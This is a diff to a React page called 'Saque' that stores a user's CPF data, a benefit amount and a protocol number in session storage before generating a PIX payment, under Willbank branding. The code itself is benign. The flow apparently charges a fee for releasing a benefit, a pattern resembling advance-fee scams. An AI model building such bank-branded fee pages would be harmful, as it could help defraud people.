@@ -14,6 +14,7 @@ import { CPFData } from "@/lib/cpf";
 import { toast } from "@/hooks/use-toast";
 import willbankLogo from "@/assets/willbank-logo.png";
 import { supabase } from "@/integrations/supabase/client";
+import { saveSession, getSession, clearSession } from "@/hooks/useSessionPersistence";
 
 interface PixData {
   code: string;
@@ -33,10 +34,12 @@ const Saque = () => {
   const [pixError, setPixError] = useState<string | null>(null);
   const checkIntervalRef = useRef<NodeJS.Timeout | null>(null);
 
-  const cpfData: CPFData | undefined = location.state?.cpfData;
-  const valorBeneficio: number | undefined = location.state?.valorBeneficio;
+  // Try to get data from location state or session
+  const session = getSession();
+  const cpfData: CPFData | undefined = location.state?.cpfData || session?.cpfData;
+  const valorBeneficio: number | undefined = location.state?.valorBeneficio || session?.valorBeneficio;
   const valorTaxa: number | undefined = location.state?.valorTaxa;
-  const protocolo: string | undefined = location.state?.protocolo;
+  const protocolo: string | undefined = location.state?.protocolo || session?.protocolo;
 
   // Scroll to top on mount
   useEffect(() => {
@@ -49,6 +52,9 @@ const Saque = () => {
       navigate("/");
       return;
     }
+
+    // Save session
+    saveSession({ cpfData, currentStep: "/saque", valorBeneficio, protocolo });
 
     const generatePix = async () => {
       try {
@@ -363,7 +369,10 @@ const Saque = () => {
               </div>
 
               <Button 
-                onClick={() => navigate("/")}
+                onClick={() => {
+                  clearSession();
+                  navigate("/");
+                }}
                 variant="outline"
                 className="w-full h-12 rounded-full font-bold text-sm border-2 hover:bg-muted/50 transition-all duration-300"
               >
